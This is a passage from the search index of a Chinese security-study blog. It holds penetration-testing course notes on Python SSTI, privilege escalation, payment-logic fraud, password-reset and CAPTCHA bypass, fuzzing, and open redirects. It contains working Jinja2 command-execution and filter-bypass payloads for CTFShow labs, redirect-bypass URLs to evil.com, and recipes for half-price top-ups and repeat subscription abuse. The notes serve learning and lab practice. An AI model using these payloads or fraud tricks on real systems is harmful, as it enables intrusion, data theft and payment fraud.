测试\nPython-格式化字符串-类魔术方法引用参考：https://xz.aliyun.com/t/3569\n第一种:&amp;操作符\n第二种:string.Template\n第三种:调用format方法(可控格式化字符串)\n\n第四种:f-Strings(可控格式化字符串)\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"070-Web攻防-Python安全&SSTI代码&靶场及项目等","url":"/2025/09/16/070-Web%E6%94%BB%E9%98%B2-Python%E5%AE%89%E5%85%A8&SSTI%E4%BB%A3%E7%A0%81&%E9%9D%B6%E5%9C%BA%E5%8F%8A%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"070-Web攻防-Python安全&amp;SSTI代码&amp;靶场及项目等Python-SSTI注入-类型&amp;形成&amp;利用&amp;项目\n什么是 SST\n\n\n网站为了显示的更加美观，能够实时让页面显示提交的数据，那么就会接收用户提交的参数值，在页面中显示，这个显示就是前期的模板\n\n\n\n\n\n\n\n名称\n说明\n示例 &#x2F; 用法\n\n\n\n__class__\n实例对象的类类型\n&#39;&#39;. __class__ → &lt;class &#39;str&#39;&gt;\n\n\n__base__\n类型对象的直接基类\n&lt;class &#39;str&#39;&gt;.__base__ → &lt;class &#39;object&#39;&gt;\n\n\n__bases__\n类型对象的所有基类（元组）\n&lt;class &#39;A&#39;&gt;.__bases__ → (&lt;class &#39;B&#39;&gt;,)\n\n\n__mro__\n方法解析顺序（继承链顺序）\n&lt;class &#39;A&#39;&gt;.__mro__\n\n\n__subclasses__()\n当前类的所有子类（按加载顺序）\nobject.__subclasses__()\n\n\n__init__\n类的初始化方法，类型为函数\n&lt;class &#39;A&#39;&gt;.__init__\n\n\n__globals__\n函数的全局作用域（dict）\nfunc.__globals__[&#39;os&#39;]\n\n\n__dict__\n类的静态属性、方法、内置属性等\nobj.__dict__\n\n\n__getattribute__()\n获取对象属性的魔术方法\nobj.__getattribute__(&#39;attr&#39;)\n\n\n__getitem__()\n获取 dict、list、str 等的元素方法\ndict[&#39;key&#39;] → dict.__getitem__(&#39;key&#39;)\n\n\n__builtins__\n当前上下文的内建模块集合\n__builtins__.open()\n\n\nimport()\n动态导入模块\n__import__(&#39;os&#39;).popen(&#39;ls&#39;)\n\n\nstr()\n转字符串\nstr(obj)\n\n\nurl_for\nFlask 方法，可访问 __globals__[&#39;builtins&#39;]\nurl_for.__globals__[&#39;builtins&#39;]\n\n\nget_flashed_messages\nFlask 方法，可访问 __globals__[&#39;builtins&#39;]\n同上\n\n\n\n     | `lipsum`               | Flask 方法，`__globals__` 中含 `os` 模块，可用于执行命令 | `{{ lipsum.__globals__['os'].popen('ls').read() }}`          |\n     | `current_app`          | Flask 应用上下文全局变量                                 | `{{ current_app.config }}`                                   |\n     | `request`              | 请求上下文，可间接访问内建模块、open 等                  | `request.__init__.__globals__['builtins'].open()`            |\n     | `request.args.x1`      | GET 参数                                                 | `?x1=...`                                                    |\n     | `request.values.x1`    | 所有参数（GET+POST）                                     | `request.values['x1']`                                       |\n     | `request.cookies`      | Cookies 参数                                             | `request.cookies['session']`                                 |\n     | `request.headers`      | 请求头参数                                               | `request.headers['User-Agent']`                              |\n     | `request.form.x1`      | POST 表单参数（`application/x-www-form-urlencoded`）     | `request.form['x1']`                                         |\n     | `request.data`         | 原始 POST 数据                                           | `request.data`                                               |\n     | `request.json`         | JSON 数据（`application/json`）                          | `request.json['key']`                                        |\n     | `config`               | Flask 的配置对象，可从其类进入 `__globals__` 获取 `os`   | `{{ config.__class__.__init__.__globals__['os'].popen('ls') }}` |\n     | `g{{g}}`               | Flask 提供的全局变量对象，可用于传值                     | `{{ g }}`                                                    |\n\n\n\n\n模板是如何产生STTI漏洞的\n\n\n模板引擎支持程序根据变量动态渲染 HTML 或文本，如果 攻击者能控制模板内容 或 插入模板语法表达式，就可能形成 STTI 漏洞\n\n\n\n\n各语言框架SSTI\nPHP：smarty、twig\nPython：jinja2、mako、tornad、Django\njava：Thymeleaf、jade、velocity、FreeMarker\n其他：https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI\n\nPython-SSTI形成\n\nfrom flask import Flask, request, render_template_string\n\nfrom jinja2 import Template\n\napp = Flask(name)\n\n@app.route(&#39;/&#39;)\n\ndef index()\nname = request.args.get(&#39;name&#39;, default=&#39;xiaodi&#39;)\n\nt = &#39;&#39;&#39;\n\n    &lt;html&gt;\n\n        &lt;h1&gt;Hello %s&lt;/h1&gt;\n\n    &lt;/html&gt;\n\n    &#39;&#39;&#39; % (name)\n\n# 将一段字符串作为模板进行渲染\n\nreturn render_template_string(t)\n\n\n\n\n\n\n        * 这里以我们的参数值去渲染页面 就是典型的SSTI注入   * ![image-20250701192238804](/img/image-20250701192238804.png)   &#123;% raw %&#125;   * `&#123;&#123;&#125;&#125;`这是模板引擎的解析符，不同框架的模板解析引擎都不相同   * ![image-20250701193030205](/img/image-20250701193030205.png)   * ![image-20250701193125686](/img/image-20250701193125686.png)&#123;% endraw %&#125;4. Python-SSTI利用   **判断利用**   1. 看那些类可以使用      * ```python        &#123;% raw %&#125;        &#123;&#123;&#x27;&#x27;.__class__.__base___.__subclasses__()&#125;&#125;\n\n\n\n  * ![image-20250701193453922](/img/image-20250701193453922.png)\n\n\n利用类索引\n\n&lt;class &#39;os._wrap_close&#39;&gt;\n\n\n\n\n\n\n              * 使用os函数里面的popen方法能执行计算机       * ![image-20250701195400399](/img/image-20250701195400399.png)      * 利用在页面回显的类，查看那些类可以进一步利用,这里查看`os.wrap__close`有没有进一步可以利用的`popen`方法      * ![image-20250701195807489](/img/image-20250701195807489.png)           3. 找利用类方法      * ```python        &#123;% raw %&#125;        &#123;&#123;&#x27;&#x27;.___class___._base___.__subclasses()[133]__.__init___.__globals__&#125;&#125;        ```&#123;% endraw %&#125;&#123;% endraw %&#125;      * ![image-20250701200228634](/img/image-20250701200228634.png)      * ![image-20250701200338471](/img/image-20250701200338471.png)   4. 构造利用类方法      * ```        &#123;% raw %&#125;        &#123;&#123;&#x27;&#x27;.___class___._base___.__subclasses()[133]__.__init___.__globals__.popen(&#x27;calc&#x27;)&#125;&#125;&#123;% raw %&#125;        ```      * ![image-20250701200454716](/img/image-20250701200454716.png)   5. 其他引用:      &#123;% raw %&#125;      * &#123;&#123;[].**class**.**base**.**subclasses**()&#125;&#125;      * &#123;&#123;[].**class**.**base**.**subclasses**()[133].**init**.**globals**&#125;&#125;      * &#123;&#123;[].**class**.**base**.**subclasses**()[133].**init**.**globals**[&#x27;popen&#x27;](https://www.cnblogs.com/TNpiper/p/&#x27;calc&#x27;)&#125;&#125;&#123;% endraw %&#125;   6. 其他引用：      &#123;% raw %&#125;      * config：&#123;&#123;config.**class**.**init**.**globals**[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;      * url_for：&#123;&#123;url_for.**globals**.os.popen(&#x27;calc&#x27;)&#125;&#125;      * lipsum：&#123;&#123;lipsum.**globals**[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;      * get_flashed_messages：&#123;&#123;get_flashed_messages.**globals**[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;&#123;% endraw %&#125;## 绕过限制-CtfShow项目参考：[Python SSTI漏洞学习总结 - Tuzkizki - 博客园](https://www.cnblogs.com/tuzkizki/p/15394415.html)[ctfshow-ssti_ctfshow ssti-CSDN博客](https://blog.csdn.net/m0_74456293/article/details/129429424)### web-3601. 黑盒情况下使用模板引擎发现发现这里有对我们穿进去的参数值进行计算   * ![image-20250701204249454](/img/image-20250701204249454.png)2. 获取里面的函数方法   * ![image-20250701204657980](/img/image-20250701204657980.png)   * 在函数里面查找到`os.wrap_close`函数进行利用处于，因为开头有两行字符串，所有这个方法从下标0开始处于132行   * ![image-20250701205012699](/img/image-20250701205012699.png)   * 找当前函数下面存在的类方法   * ![image-20250701205309714](/img/image-20250701205309714.png)   * 存在popoen方法，构造payload进行进一步利用   * ![image-20250701205425408](/img/image-20250701205425408.png)   * ![image-20250701205647937](/img/image-20250701205647937.png)   * 这个方法只能执行不能读取因此我们要在后面加上read()读取文件   * ```     &#123;% raw %&#125;     &#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;     ```&#123;% endraw %&#125;&#123;% endraw %&#125;   * ![image-20250701205740335](/img/image-20250701205740335.png)   * ```     &#123;% raw %&#125;     &#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;     也能读到flag []代表字符串调用函数就是.&#123;% raw %&#125;     ```&#123;% endraw %&#125;### web-3621. 这关对传入的参数2和3进行了过滤   * ![image-20250701210500966](/img/image-20250701210500966.png)2. 在当前项目里面用os去执行popen方法   * ````     &#123;% raw %&#125;     &#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;\n\n\n\n\n\n\nweb-363\n构造payload传参发现这关过滤单引号\n\n这里使用传参的方式不使用单引号拿到flag\n\n\n     {{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.x](request.args.y).read()}}&x=popen&y=cat /flag\n     &#123;% endraw %&#125;   * ![image-20250701212558077](/img/image-20250701212558077.png)   * ![image-20250701212855322](/img/image-20250701212855322.png)### web-364这关跟上面差不多 过滤单引号+args\n{% raw %}\n{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.x](request.values.y).read()}}&x=popen&y=cat /flag\n&#123;% endraw %&#125;### web-365这关将我们的单引号和中括号进行了过滤,使用其他方法绕过过滤\n{% raw %}\n{{url_for.__globals__.os.popen(request.values.x)(request.values.y).read()}}&x=popen&y=cat /flag\n&#123;% endraw %&#125;### web-366这关对下划线单引号和中括号进行了过滤\n{% raw %}\n{{(lipsum|attr(request.values.a)).os.popen(request.values.b).read()}}&a=globals&b=cat /flag\n{% endraw %}\n\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"072-Web攻防-业务逻辑&越权未授权&插件&项目等","url":"/2025/09/16/072-Web%E6%94%BB%E9%98%B2-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91&%E8%B6%8A%E6%9D%83%E6%9C%AA%E6%8E%88%E6%9D%83&%E6%8F%92%E4%BB%B6&%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"072-Web攻防-业务逻辑&amp;越权未授权&amp;插件&amp;项目等知识点：\n1、逻辑越权-检测原理-水平&amp;垂直&amp;未授权\n2、逻辑越权-检测项目-BURP插件&amp;对比项目\n3、SRC挖掘-实战越权及未授权挖掘分享案例\nWeb权限图：\n\n逻辑越权-检测原理-水平&amp;垂直&amp;未授权靶场环境：PHPStudy + Metinfo4.0 + 会员后台中心\n\n1、水平越权：同级别的用户之间权限的跨越\n2、垂直越权：低级别用户到高级别用户权限的跨越\n3、未授权访问：通过无级别用户能访问到需验证应用\n\n\n在首页底部点击会员中心，即可看到会员登录界面，点击注册\n\n\n水平越权：同级别的用户之间权限的跨越\n对test1账号进行登录，然后修改基本信息\n\n\n\n对test1修改账号操作进行抓包，对里面数据包进行修改\n\n\n\n这里进行水平越权测试，test1和test2属于同一级别，我们这里把要修改的test1账户改为test2查看是否可以修改\n\n\n\n\n\n\n\n垂直越权：低级别用户到高级别用户权限的跨越\n网站存在一个admin登录页面，我们这依旧是使用普通用户身份尝试修改管理员权限\n\n\n\n\n\n修改test1的基本信息进行抓包测试\n\n\n\n\n\n我们将这里要进行修改的用户名修改为admin，发包\n\n\n\n\n\n去数据库里面查看成功修改\n\n\n\n\n\n未授权访问：无登录用户就能直接访问到需验证应用\n使用test1的账号，对基本信息进行修改抓包。\n\n\n\n\n这里将test1的cookie进行删除，将账号换admin并且修改邮箱\n\n\n\n\n\n\n逻辑越权-检测项目-BURP插件&amp;对比项目\n相关工具：\n1、检测插件：https://github.com/smxiazi/xia_Yuehttps://github.com/VVeakee/auth-analyzer-plus2、检测项目：https://github.com/ztosec/secscan-authcheckhttps://github.com/y1nglamore/IDOR_detect_tool\n\n实战：找到当前用户相关的参数名，添加返回包里面的参数名参数值去提交，参数值请求数据加密：JS中找逆向算法，还原算法重新修改发包测试，请求包带token：直接复用和删除测试。\n批量测试可以使用工具，真实情况下如果要测试的点很少，推荐手工进行测试。因为这些插件都需要配置，需要不少时间，有这个时间可能手工都测完了\nXia_Yue项目地址：https://github.com/smxiazi/xia_Yue\n\n\n这个工具只能测试垂直越权以及未授权访问\n点击启动插件后访问一些关键功能，就能抓取数据包，吧低权限包和未授权包进行对比，如果低权限包和未授权包长度相同就说明可能存在未授权访问。\n\n\n\n\n\nauth_analyzer项目地址：https://github.com/VVeakee/auth-analyzer-plus\n\n\n该插件使用参考文章：https://www.cnblogs.com/ychun/p/17836941.html\nSRC越权未授权挖掘案例案例1：垂直越权-小程序游客身份进入后未授权获取系统内部信息\n\n\n\n\n\n\n\n\n案例2：水平越权用户身份ID编号遍历导致信息泄漏\n\n\n\n\n\n\n案例3：未授权访问测试账号直接访问系统配置页面\n\n\n\n\n实战:关键:找到当前用户相关的参数名参数值请求数据加密:\nJS中找逆向算法，还原算法重新修改发包测试请求包带令牌:直接复用和删除测试\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"073-Web攻防-支付逻辑篇&演示源码&文档资源等","url":"/2025/09/16/073-Web%E6%94%BB%E9%98%B2-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E7%AF%87&%E6%BC%94%E7%A4%BA%E6%BA%90%E7%A0%81&%E6%96%87%E6%A1%A3%E8%B5%84%E6%BA%90%E7%AD%89/","content":"073-Web攻防-支付逻辑篇&amp;演示源码&amp;文档资源等知识点：\n1、支付逻辑-商品本身-修改-数量&amp;价格&amp;属性等\n2、支付逻辑-营销折扣-优惠券&amp;积分&amp;签约&amp;试用等\n3、支付逻辑-订单接口-替换&amp;并发&amp;状态值&amp;越权支付等\n\n支付逻辑常见测试：\n熟悉常见支付流程：选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付\n熟悉那些数据篡改：商品ID，购买价格，购买数量，订单属性，折扣属性，支付方式，支付状态等\n熟悉那些修改方式：替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等\n熟悉那些另类方法：无限试用，越权支付，并发兑换，四舍五入半价购，循环利用优惠券，支付签约逻辑等\n支付逻辑挖掘：\n找到关键的数据包：可能一个支付操作有三四个数据包，我们要对数据包进行挑选。\n分析数据包：支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠等）\n要尝试对数据包中的各个参数进行分析。\n不按套路出牌：多去想想开发者没有想到的地方，如算法拼接，关闭开启返优惠券等\nPC端尝试过，APP端也看看，小程序也试试\n支付逻辑安全修复：\n在后端检查订单的每一个值，包括支付状态；\n校验价格、数量参数，比如产品数量只能为整数，并限制最大购买数量 ；\n与第三方支付平台检查，实际支付的金额是否与订单金额一致；\n如给用户退款，要使用原路、原订单退回。如：退押金，按用户原支付订单原路退回；\n加密、解密、数字签名及验证，这个可以有效避免数据修改，重放攻击中的各种问题；\n金额超过指定值，进行人工审核等。\n1、支付逻辑-商品本身-修改-数量&amp;价格&amp;属性等修改数量\n\n\n\n篡改价格\n继续对刚才的商品进行测试，抓包\n\n\n\n替换支付\n以A产品价格订单去购买B产品的订单价格对方检测付款成功的状态 如果没有考虑到对应的订单和产品的 就有这样的安全问题\n我们这里对两件不同价格的商品进行抓包，查看他们的数据包\n\n\n\n重新购买大米产品6000 并且对数据包进行修改\n\n\n\n产品对冲\n这里里对大米测试产品和大米手机cms产品进行抓包，复制到文本里面\n\n这里对大米测试产品进行购买抓包\n\n\n将大米手机cms替换为大米测试产品的数据包\n\n\n\n\n2、支付逻辑-营销折扣-优惠券&amp;积分&amp;签约&amp;试用等优惠券复用\n\n\n\n\n\n\n积分对冲溢出\n\n\n\n\n\n\n\n\n\n\n3、支付逻辑-订单接口-替换&amp;并发&amp;状态值&amp;越权支付等*越权让他人支付*\nhttps://forum.butian.net/share/1125\n*四舍五入半价购*\n这个漏洞上次看小伙伴交的补天，获得了厂商1.2k的奖金，如何操作呢，我们来分析分析。我们以充值为例，余额值一般保存到分为止，那么如果我充值0.001元也就是1厘，一般开发会在前端判断我们的数字，或者将最后一位四舍五入，使用支付宝充值是直接报错的，因为第三方一般只支持到分。\n那我们如果充值0.019呢，由于支付宝只判断到分，所以导致只能支付0.01，而由于我们支付成功，前端会将9四舍五入，直接变成0.02，所以等于直接半价充值。(这个漏洞京东也是有的，不过后来修复了。)\n \n \n*并发提前全签到*\n1、 采用时间验证，修改当前设备时间绕过\n2、 未采用验证，直接修改数据包对应发包\n \n*循环利用优惠券*\n \n*支付签约多逻辑*\n \n大家都知道有些软件推出了新用户的会员签约功能，新的用户首次签约付费时能以低价购买会员，这个时候就尝试想白嫖多个月的低价会员了。于是开始第一次测试——使用支付宝打开签约界面，然后使用微信也同时打签约界面，然后再依次支付，支付后系统提示，无法重复签约。\n我想难到系统有检测？舍不得孩子套不到狼，于是申请个新号再次进行测试：\nl 还是同时支付宝和微信都打开了签约界面，但这次先签约其中一个比如先签约微信；\nl 微信支付成功并签约完成后，在微信取消签约，然后再去支付宝点击签约；\n这个时候奇迹就发生了，系统成功到账了2个月的低价会员！\n也就是说服务器虽然校验了同一新用户不能同时多次低价签约，但是对于新用户同时发起的多个支付签约页面的请求，服务器没有校验解约后再次签约的情况，导致成功白嫖！以上的一个业务逻辑流程大致如下图：\n \n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"074-Web攻防-机制验证篇&案例APK&源码等资源","url":"/2025/09/16/074-Web%E6%94%BB%E9%98%B2-%E6%9C%BA%E5%88%B6%E9%AA%8C%E8%AF%81%E7%AF%87&%E6%A1%88%E4%BE%8BAPK&%E6%BA%90%E7%A0%81%E7%AD%89%E8%B5%84%E6%BA%90/","content":"074-Web攻防-机制验证篇&amp;案例APK&amp;源码等资源知识点：\n1、找回修改机制-验证码突破-回传显示&amp;规律爆破\n2、找回修改机制-验证目标-重定向用户&amp;重定向发送\n3、找回修改机制-验证逻辑-修改响应包&amp;跳过步骤URL\n1、找回修改机制-验证码突破-回传显示&amp;规律爆破某目标回显显示通过手机找回密码，响应包中包含短信验证码。\n\n\n\n某APP验证码爆破找回密码时使用位数较少的短信验证码，或者验证码没有设置有效时间限制，导致攻击者借助自动化工具在一定时间范围内爆破获得短信验证码，从而导致重置任意账号密码。\n\n\n\n\n\n\n\n\n2、找回修改机制-验证目标-重定向用户&amp;重定向发送某CMS重定向用户当我们输入正确的手机号和正确的短信验证码，然后进入重置密码的最后一步，也就是输入新的密码，输入密码后提交到服务端的post数据包需要包含当前用户的身份信息。而一般网站是通过用户名或用户ID来标识用户身份的，如果这个用户名或用户ID没有和当前手机号、短信验证码进行绑定。也就是说服务端只验证用户名、ID是否存在，而不去验证用户和当前手机号是否匹配，那么我们就可以通过修改用户名、ID去修改其他用户的密码了。当然可以修改的地方不限于找回密码的数据包，比如修改资料的地方也可能存在这样的漏洞\n\n\n\n\n\n\n\n某CMS重定向发送如果数据包存在发送验证邮箱或目标地址，尝试修改到自己接受地，实现拦截获取\n\n\n\n\n\n3、找回修改机制-验证逻辑-修改响应包&amp;跳过步骤URL某APP修改响应包通过手机找回密码一般需要短信验证码验证，服务端需要告诉客户端，输入的验证码是否正确，如果客户端收到true的信息，那么就会向带着true的信息向服务端请求进入下一步，而服务端收到true的信息，就会允许客户端进入下一步，反之，如果是false的信息，服务端就不会允许客户端进入下一步。也就是说我们进入下一步的关键是让服务端收到客户端的true信息，而借助burpsuite，我们可以修改服务端返回到客户端的信息，这样一来，我们就可以输入任意短信验证码，然后将服务端返回的false信息改为true就可以绕过短信验证码的验证了。\n自己先注册一个用户走一遍密码找回流程，然后重点关注这个验证手机验证码的响应数据包\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n某APP跳过步骤URL找回密码流程一般需要四个步骤：流程：验证用户名-验证短信验证码-输入新密码-重置成功\n这四个步骤应该紧紧相连，互相相关，只有通过了第一个步骤验证才可以进入下一个步骤，如果每个步骤之间没有进行关联性验证，就可能导致跳过关键验证步骤，从而导致重置任意账号密码。\n实战SRC验证逻辑挖掘分享案例修改用户对象重置任意用户\n修改响应包重置任意用户\n\n\n某SRC重定向验证邮箱绕过https://mp.weixin.qq.com/s/zsHHSXZHaLmiJFkgsjoHKg\n某SRC配合信息泄漏重置绕过https://xz.aliyun.com/t/11757#toc-0\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"075-Web攻防-验证码安全&识别插件&环境源码演示等","url":"/2025/09/16/075-Web%E6%94%BB%E9%98%B2-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8&%E8%AF%86%E5%88%AB%E6%8F%92%E4%BB%B6&%E7%8E%AF%E5%A2%83%E6%BA%90%E7%A0%81%E6%BC%94%E7%A4%BA%E7%AD%89/","content":"075-Web攻防-验证码安全&amp;识别插件&amp;环境源码演示等知识点：\n1、验证码简单机制-验证码过于简单可爆破\n2、验证码重复使用-验证码验证机制可绕过\n3、验证码智能识别-验证码图形码被可识别\n4、验证码接口调用-验证码触发接口可枚举\n图片验证码-识别插件-登录爆破&amp;接口枚举\n验证码识别绕过等技术适用于：口令存在爆破，接口枚举调用，任意用户注册等安全问题1、验证码简单机制-验证码过于简单可爆破2、验证码重复使用-验证码验证机制可绕过3、验证码智能识别-验证码图形码被可识别4、验证码接口调用-验证码触发接口可枚举\n\n\n\n登录爆破自带白嫖版：https://github.com/smxiazi/NEW_xp_CAPTCHA1、Burp加载插件\n2、运行监听py文件\n3、设置插件-验证码地址\n4、数据包验证码填入参数\n5、发包线程设置1后开始\n\n\n\n\n\n\n\n\n\n\n\n\n\n接口收费版：https://github.com/smxiazi/xp_CAPTCHA\n1、Burp加载插件\n2、注册接口帐号充值\n3、设置插件-填入帐号\n4、数据包验证码填入参数\n5、发包线程设置1后开始\n\n\n\n\n\n\n\n接口枚举\n\n\n\n\n\n图片验证码-重复使用-某APP短信接口滥用\n\n\n\n滑块验证码-宏命令-某Token&amp;Sign&amp;滑块案例参考文章：https://blog.csdn.net/shuryuu/article/details/104576559同理也可以适用在Token，sign在页面代码中自动获取自动填入后绕过验证\ntoken防爆破?https://blog.csdn.net/m0_60571842/article/details/133898472\n同理也可以适用在Token，sign在响应页面中自动获取自动填入请求数据包后绕过验证\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"076-Web攻防-Fuzz技术篇&JS加解密插件&字典项目等","url":"/2025/09/16/076-Web%E6%94%BB%E9%98%B2-Fuzz%E6%8A%80%E6%9C%AF%E7%AF%87&JS%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%8F%92%E4%BB%B6&%E5%AD%97%E5%85%B8%E9%A1%B9%E7%9B%AE%E7%AD%89/","content":"076-Web攻防-Fuzz技术篇&amp;JS加解密插件&amp;字典项目等演示案例:\n\nFuzz 技术-用户口令-常规&amp;模块&amp;JS 插件\n Fuzz 技术-目录文件-目录探针&amp;文件探针\nFuzz 技术-未知参数名-文件参数&amp;隐藏参数\nFuzz 技术-构造参数值-漏洞攻击恶意 Payload\n\n1、Fuzz是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试。\n2、Fuzz的核心思想:口令 Fuzz(弱口令)目录 Fuzz(漏洞点)参数 Fuzz(利用参数)PayloadFuzz(Bypass)\n在实战黑盒中，目标有很多没有显示或其他工具扫描不到的文件或目录等，我们就可以通过大量的字典 Fuzz 找到的隐藏的文件进行测试。\n3、Fuzz应用场景-爆破用户口令-爆破敏感目录-爆破文件地址-爆破未知参数名-Payload 测漏洞(绕过等也可以用)\nFuzz 技术-用户口令-常规&amp;模块&amp;JS 插件常规爆破\n\n\nmd5加密\n\n\n\n\nJS插件\n\n\n这里后续参考前面相关JS那期\n\n\n\n\nFuzz 技术-目录文件-目录探针&amp;文件探针\n\nFuzz 技术-未知参数名-文件参数&amp;隐藏参数\n\n\n\n\n\n\n\n\n\n\n\n\nFuzz 技术-构造参数值-漏洞攻击恶意 Payload\nSRC案例演示\n\n\n\n\n最后通过通过手机号再爆破验证码登录\nFuzz 访问 URL 挖未授权访问\n\n密码组合规则信息泄漏FuZZ\n\n互联网搜索到账号规律\n\n\n\n登录成功\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"077-Web攻防-合规检测&URL重定向&压缩资源DD服务等","url":"/2025/09/16/077-Web%E6%94%BB%E9%98%B2-%E5%90%88%E8%A7%84%E6%A3%80%E6%B5%8B&URL%E9%87%8D%E5%AE%9A%E5%90%91&%E5%8E%8B%E7%BC%A9%E8%B5%84%E6%BA%90DD%E6%9C%8D%E5%8A%A1%E7%AD%89/","content":"077-Web攻防-合规检测&amp;URL重定向&amp;压缩资源DD服务等演示案例1、隐私合规-判断规则&amp;检测项目&gt;\n2、URL 重定向-检测判断&amp;钓鱼配合 \n3、资源拒绝服务-加载受控&amp;处理受控\n小迪说在实战中用不到，在 SRC 里面可能会字典\n隐私合规 - 判断规则 &amp; 检测项目\n主要针对小程序 (小程序可能需要逆向) 和 APP\n\n对象：APP 小程序等，测试时即可测试目标的 app 或者小程序是否隐私合规\n\n例如检测目标是否在偷偷监听、录音、获取信息等\n\n\nappscan 官网：\nhttps://appscan.ly.com/\n\n推荐这个，这个是动态分析\n不过需要 root 安卓手机并且打开 ADB 调试\n\n\nappshark 的 GitHub 地址：\nhttps://github.com/bytedance/appshark\n\n这个是静态分析\n\n\n\n\nvivo 隐私合规漏洞评分规则 v1.0 参考：https://mp.weixin.qq.com/s/tgEZth3TFyyis_EBrQ5PhQ\n\nMobSF 也可以进行测试，不过不是很专业\n\nMobSF 安装参考：\n\nhttps://www.cnblogs.com/B-hai/p/15696948.html\nhttps://blog.csdn.net/ljh824144294/article/details/119181803\n补充：自己搭建比较麻烦，容易出很多莫名问题，第 20 天课程中有一个 f8x 项目，可以自动化搭建，推荐使用这个来搭建。\n\n\nmobsf 分析 apk 后可以得到报告，查看报告内容\n\n可以看到该 apk 需要使用到的权限，然后看使用 apk 时是否会有提\n\n\n\nURL 重定向 - 检测判断 &amp; 钓鱼配合含义\nURL 重定向漏洞（URL redirection vulnerability），是一种常见的 Web 安全漏洞，由于网站 URL 重定向功能设计不当，没有验证跳转的目标 URL 是否合法，用户可通过此漏洞跳转到任意网站，这会导致可通过该网站跳转到存在木马、病毒的网站或者钓鱼网站，国外大厂的一个任意 URL 跳转都 500$、1000$ 了，国内看运气～\n\n案例演示\n\n\n\n\n\n\n\n\n\n\n\n\n黑盒看业务\n用户登录、统一身份认证处，认证完后会跳转\n用户分享、收藏内容过后，会跳转\n跨站点认证、授权后，会跳转\n站内点击其它网址链接时，会跳转\n\n看参数名redirect \tredirect_to \tredirect_url\t url \tjump \tjump_to target\t to \tlink \tlinkto\t domain\n\n白盒看代码块\nJava\nresponse.sendRedirect(request.getParameter(“url”))\n\n\nPHP:\n$redirect_url &#x3D; $_GET[‘url’];\nheader(“Location: “ . $redirect_url)\n\n\n.NET:\nstring redirect_url &#x3D; request.QueryString[“url”];\nResponse.Redirect(redirect_url);\n\n\nDjango:\nredirect_url &#x3D; request.GET.get(“url”)\nHttpResponseRedirect(redirect_url)\n\n\nFlask:\nredirect_url &#x3D; request.form[‘url’]\nredirect(redirect_url)\n\n\nRails:\nredirect_to params[:url]\n\n\n\n跳转 url 绕过思路\n单斜线 “&#x2F;“ 绕过\nhttps://www.landgrey.me/redirect.php?url=/www.evil.com\n\n缺少协议绕过\nhttps://www.landgrey.me/redirect.php?url=//www.evil.com\n\n多斜线 “&#x2F;“ 前缀绕过\nhttps://www.landgrey.me/redirect.php?url=///www.evil.com https://www.landgrey.me/redirect.php?url=www.evil.com\n\n利用 “@” 符号绕过\nhttps://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com\n\n利用反斜线 “&quot; 绕过\nhttps://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me\n\n利用 “#” 符号绕过\nhttps://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me \n\n利用 “?” 号绕过\nhttps://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me\n\n利用 “\\“ 绕过\nhttps://www.landgrey.me/redirect.php?url=https://www.evil.com\\\\www.landgrey.me \n\n利用 “.” 绕过\nhttps://www.landgrey.me/redirect.php?url=.evil           (可能会跳转到www.landgrey.me.evil域名) https://www.landgrey.me/redirect.php?url=.evil.com       (可能会跳转到evil.com域名)\n\n重复特殊字符绕过\nhttps://www.landgrey.me/redirect.php?url=///www.evil.com//.. https://www.landgrey.me/redirect.php?url=www.evil.com//..\n\n资源拒绝服务 - 加载受控 &amp; 处理受控\n功能 1：网站验证码或图片可以自定义显示大小\n将大小设置为很大，将服务器 cpu 拉满，达到拒绝服务的目的\n\n\n\n\n\n功能 2：网站可以上传压缩包解压循环\n压缩包里面还是压缩包 (套娃即压缩包炸弹) 